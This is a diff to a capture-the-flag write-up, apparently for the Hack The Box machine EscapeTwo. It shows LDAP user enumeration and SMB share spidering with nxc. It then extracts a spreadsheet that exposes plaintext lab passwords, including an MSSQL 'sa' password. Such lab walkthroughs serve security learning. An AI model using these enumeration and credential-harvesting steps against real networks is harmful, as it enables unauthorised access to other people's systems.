@@ -74,10 +74,54 @@ SMB         10.10.11.51     445    DC01             Users           READ
 And the users
 ```bash
 nxc ldap 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt
+
+Administrator
+Guest
+krbtgt
+michael
+ryan
+oscar
+sql_svc
+rose
+ca_svc
+```
+
+Spider the files on the smb server
+```bash
+nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
 
+```bash
+cp -r /home/wither/.nxc/modules/nxc_spider_plus/10.10.11.51 .
+```
 
+
+Unzip the `accounts.xlsx` file to reveal a list of passwords in `xl/sharedStrings.xml`.
+```bash
+ls
+accounting_2024.xlsx  accounts.xlsx
+
+
+unzip accounts.xlsx       
+Archive:  accounts.xlsx
+file #1:  bad zipfile offset (local header sig):  0
+  inflating: xl/workbook.xml         
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/styles.xml           
+  inflating: xl/worksheets/_rels/sheet1.xml.rels  
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/sharedStrings.xml    
+  inflating: _rels/.rels             
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml        
+  inflating: docProps/custom.xml     
+  inflating: [Content_Types].xml     
+                                                                                                                                                                                             
+wither@kali:~/CTF/HTB/EscapeTwo/files/10.10.11.51/Accounting Department$ grep -r "Password"                                                                  
+xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
+
+```
 
 ## Enumeration
 
